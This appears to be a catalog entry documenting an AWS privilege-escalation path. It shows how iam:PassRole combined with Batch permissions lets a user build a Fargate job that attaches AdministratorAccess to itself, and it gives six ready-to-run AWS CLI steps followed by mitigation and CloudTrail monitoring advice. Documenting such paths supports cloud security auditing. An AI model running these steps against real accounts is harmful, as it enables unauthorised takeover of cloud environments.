id: batch-003
name: iam:PassRole + batch:CreateComputeEnvironment + batch:CreateJobQueue + batch:RegisterJobDefinition + batch:SubmitJob
category: new-passrole
services:
  - iam
  - batch

parent:
  id: batch-001
  modification: Adds `batch:CreateComputeEnvironment` and `batch:CreateJobQueue` to build the entire Batch pipeline from scratch, removing the prerequisite that an existing job queue and compute environment must already exist in the account.

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role and a Batch execution role to the Batch service
    - permission: batch:CreateComputeEnvironment
      resourceConstraints: No resource constraints required; auto-creates an ECS cluster via the Batch service-linked role
    - permission: batch:CreateJobQueue
      resourceConstraints: No resource constraints required; must reference the attacker-created compute environment
    - permission: batch:RegisterJobDefinition
      resourceConstraints: No resource constraints required
    - permission: batch:SubmitJob
      resourceConstraints: No resource constraints required
  additional:
    - permission: batch:DescribeComputeEnvironments
      resourceConstraints: Helpful for monitoring compute environment status during creation
    - permission: batch:DescribeJobQueues
      resourceConstraints: Helpful for verifying job queue creation and state
    - permission: batch:DescribeJobs
      resourceConstraints: Useful for polling job status to confirm execution
    - permission: batch:DescribeJobDefinitions
      resourceConstraints: Useful for verifying job definition registration
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success
    - permission: iam:ListRoles
      resourceConstraints: Helpful for discovering IAM roles in the account to identify passable admin and execution roles
    - permission: ec2:DescribeSubnets
      resourceConstraints: Helpful for discovering available VPC subnets for the Fargate compute environment
    - permission: ec2:DescribeSecurityGroups
      resourceConstraints: Helpful for discovering available security groups for the Fargate compute environment

description: A principal with `iam:PassRole` and broad AWS Batch permissions can escalate privileges by building the entire Batch pipeline from scratch — a Fargate compute environment, a job queue, and a job definition that passes an admin IAM role as the `jobRoleArn` — then submitting a job that calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. Because the attacker creates every component of the pipeline, no pre-existing Batch infrastructure is required, making this path exploitable in accounts where AWS Batch has never been used before.

prerequisites:
  admin:
    - A role must exist that trusts ecs-tasks.amazonaws.com to assume it (so it can be passed as jobRoleArn to a Batch job definition)
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - A Batch execution role must exist that trusts ecs-tasks.amazonaws.com with the AmazonECSTaskExecutionRolePolicy attached, required for Fargate to pull container images
    - A VPC subnet with internet access (public subnet or NAT gateway) must be available for the Fargate compute environment
  lateral:
    - A role must exist that trusts ecs-tasks.amazonaws.com to assume it (so it can be passed as jobRoleArn to a Batch job definition)
    - A Batch execution role must exist that trusts ecs-tasks.amazonaws.com with the AmazonECSTaskExecutionRolePolicy attached, required for Fargate to pull container images
    - A VPC subnet with internet access (public subnet or NAT gateway) must be available for the Fargate compute environment

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws batch create-compute-environment \
          --compute-environment-name privesc-compute-env \
          --type MANAGED \
          --state ENABLED \
          --compute-resources '{
            "type": "FARGATE",
            "maxvCpus": 2,
            "subnets": ["SUBNET_ID"],
            "securityGroupIds": ["SECURITY_GROUP_ID"]
          }'
      description: Create a new Fargate-managed compute environment from scratch. This auto-creates an underlying ECS cluster via the Batch service-linked role.
    - step: 2
      command: |
        aws batch create-job-queue \
          --job-queue-name privesc-job-queue \
          --state ENABLED \
          --priority 1 \
          --compute-environment-order '[{"order":1,"computeEnvironment":"privesc-compute-env"}]'
      description: Create a new job queue wired to the attacker-created compute environment.
    - step: 3
      command: |
        aws batch register-job-definition \
          --job-definition-name privesc-job-def \
          --type container \
          --platform-capabilities FARGATE \
          --container-properties '{
            "image": "amazon/aws-cli:latest",
            "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/AdminRole",
            "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/BatchExecutionRole",
            "resourceRequirements": [
              {"type": "VCPU", "value": "0.25"},
              {"type": "MEMORY", "value": "512"}
            ],
            "networkConfiguration": {"assignPublicIp": "ENABLED"},
            "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
          }'
      description: Register a new Batch job definition that passes the admin IAM role as jobRoleArn and the execution role as executionRoleArn, with a container command that attaches AdministratorAccess to the starting user.
    - step: 4
      command: |
        aws batch submit-job \
          --job-name privesc-job \
          --job-queue privesc-job-queue \
          --job-definition privesc-job-def
      description: Submit the job to the attacker-created job queue. The Fargate container launches, assumes the admin jobRoleArn, and executes the IAM escalation command.
    - step: 5
      command: |
        aws batch describe-jobs \
          --jobs JOB_ID \
          --query 'jobs[0].status' \
          --output text
      description: Poll job status until it reaches SUCCEEDED, indicating the privilege escalation command has executed.
    - step: 6
      command: |
        aws iam list-attached-user-policies \
          --user-name STARTING_USER
      description: Verify that AdministratorAccess is now attached to the starting user.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` combined with the ability to build an entire Batch pipeline from scratch is what makes this privilege escalation path exploitable and especially dangerous, since no pre-existing Batch infrastructure is required.

  - **Avoid administrative service roles** - Very rarely does a Batch job role need administrative access. Use the principle of least privilege for any role that trusts `ecs-tasks.amazonaws.com`.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBatchJobRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict pipeline-building permissions** - Deny `batch:CreateComputeEnvironment` and `batch:CreateJobQueue` for non-automation principals via SCPs; these permissions let an attacker construct the entire attack pipeline without relying on pre-existing infrastructure.
  - Monitor CloudTrail for unusual Batch compute environment or job queue creation followed by immediate job definition registration and submission
  - Monitor CloudTrail for Batch resource creation by principals who do not usually create Batch infrastructure
  - Monitor CloudTrail for roles being passed to Batch that haven't been used before, especially via `batch:RegisterJobDefinition` requests where `containerProperties.jobRoleArn` references a privileged role
  - Monitor and alert on Batch job definition registration with privileged roles
  - Regularly audit Batch job definitions for excessive IAM permissions
  - Regularly audit all IAM roles that trust `ecs-tasks.amazonaws.com` and down-scope any roles with administrative access

